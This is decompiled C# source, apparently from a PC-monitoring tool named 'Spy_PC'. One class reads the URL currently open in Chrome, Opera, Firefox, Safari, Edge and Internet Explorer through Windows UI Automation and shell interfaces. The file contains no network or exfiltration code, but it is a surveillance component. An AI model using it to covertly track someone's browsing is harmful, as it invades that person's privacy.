using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Automation;
using SHDocVw;

namespace Spy_PC;

internal class NativeBrowserController
{
	public static string getBrowserData(string type)
	{
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_0061: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Expected O, but got Unknown
		//IL_00de: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e4: Expected O, but got Unknown
		//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ee: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Unknown result type (might be due to invalid IL or missing references)
		//IL_0169: Unknown result type (might be due to invalid IL or missing references)
		//IL_016f: Expected O, but got Unknown
		//IL_017b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0181: Expected O, but got Unknown
		//IL_0181: Unknown result type (might be due to invalid IL or missing references)
		//IL_018b: Expected O, but got Unknown
		//IL_0195: Unknown result type (might be due to invalid IL or missing references)
		//IL_019a: Unknown result type (might be due to invalid IL or missing references)
		//IL_019f: Unknown result type (might be due to invalid IL or missing references)
		//IL_023d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0243: Expected O, but got Unknown
		//IL_024f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0255: Expected O, but got Unknown
		//IL_0255: Unknown result type (might be due to invalid IL or missing references)
		//IL_025f: Expected O, but got Unknown
		//IL_0269: Unknown result type (might be due to invalid IL or missing references)
		//IL_026e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0273: Unknown result type (might be due to invalid IL or missing references)
		ValuePatternInformation current;
		switch (type)
		{
		case "chrome":
		{
			Process[] processesByName = Process.GetProcessesByName("chrome");
			foreach (Process process3 in processesByName)
			{
				if (!(process3.MainWindowHandle == IntPtr.Zero))
				{
					AutomationElement val = AutomationElement.FromHandle(process3.MainWindowHandle).FindFirst((TreeScope)4, (Condition)new PropertyCondition(AutomationElement.NameProperty, (object)"Address and search bar"));
					if (val != (AutomationElement)null)
					{
						return (string)val.GetCurrentPropertyValue(ValuePatternIdentifiers.ValueProperty);
					}
					return "";
				}
			}
			goto IL_038a;
		}
		case "opera":
		{
			Process[] processesByName = Process.GetProcessesByName("opera");
			int num = 0;
			if (0 < processesByName.Length)
			{
				Process process4 = processesByName[num];
				try
				{
					current = ((ValuePattern)AutomationElement.FromHandle(process4.MainWindowHandle).FindFirst((TreeScope)7, (Condition)new AndCondition((Condition[])(object)new Condition[2]
					{
						(Condition)new PropertyCondition(AutomationElement.NameProperty, (object)"Search or enter address"),
						(Condition)new PropertyCondition(AutomationElement.ControlTypeProperty, (object)ControlType.Edit)
					})).GetCurrentPattern(ValuePattern.Pattern)).get_Current();
					return ((ValuePatternInformation)(ref current)).get_Value();
				}
				catch (Exception)
				{
					return "";
				}
			}
			goto IL_038a;
		}
		case "firefox":
		{
			Process[] processesByName = Process.GetProcessesByName("FireFox");
			int num = 0;
			if (0 < processesByName.Length)
			{
				Process process2 = processesByName[num];
				try
				{
					current = ((ValuePattern)AutomationElement.FromHandle(process2.MainWindowHandle).FindFirst((TreeScope)7, (Condition)new AndCondition((Condition[])(object)new Condition[2]
					{
						(Condition)new PropertyCondition(AutomationElement.NameProperty, (object)"Search or enter address"),
						(Condition)new PropertyCondition(AutomationElement.ControlTypeProperty, (object)ControlType.Edit)
					})).GetCurrentPattern(ValuePattern.Pattern)).get_Current();
					string value2 = ((ValuePatternInformation)(ref current)).get_Value();
					Console.WriteLine("URL:" + value2);
					return value2;
				}
				catch (Exception)
				{
					Console.WriteLine("\r\n");
					return "";
				}
			}
			goto IL_038a;
		}
		case "edge":
			return new EdgeBrowser().GetDetails();
		case "safari":
		{
			Process[] processesByName = Process.GetProcessesByName("safari");
			int num = 0;
			if (0 < processesByName.Length)
			{
				Process process = processesByName[num];
				try
				{
					current = ((ValuePattern)AutomationElement.FromHandle(process.MainWindowHandle).FindFirst((TreeScope)7, (Condition)new AndCondition((Condition[])(object)new Condition[2]
					{
						(Condition)new PropertyCondition(AutomationElement.NameProperty, (object)"Search or enter address"),
						(Condition)new PropertyCondition(AutomationElement.ControlTypeProperty, (object)ControlType.Edit)
					})).GetCurrentPattern(ValuePattern.Pattern)).get_Current();
					string value = ((ValuePatternInformation)(ref current)).get_Value();
					Console.WriteLine("URL:" + value);
					return value;
				}
				catch (Exception)
				{
					Console.WriteLine("\r\n");
					return "";
				}
			}
			goto IL_038a;
		}
		case "ie":
			foreach (InternetExplorer item in (ShellWindows)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("9BA05972-F6A8-11CF-A442-00A0C90A8F39"))))
			{
				string text = Path.GetFileNameWithoutExtension(item.FullName)!.ToLower();
				if (text.Equals("iexplore"))
				{
					Console.WriteLine("Web Site   : {0}", item.LocationURL);
					if (item.LocationURL != "")
					{
						return item.LocationURL;
					}
				}
				if (text.Equals("explorer"))
				{
					Console.WriteLine("Hard Drive : {0}", item.LocationURL);
					return item.LocationURL;
				}
			}
			goto IL_038a;
		default:
			{
				Console.WriteLine("@Error:Try again with chrome,opera,firefox,edge,safari");
				return "";
			}
			IL_038a:
			return "";
		}
	}
}
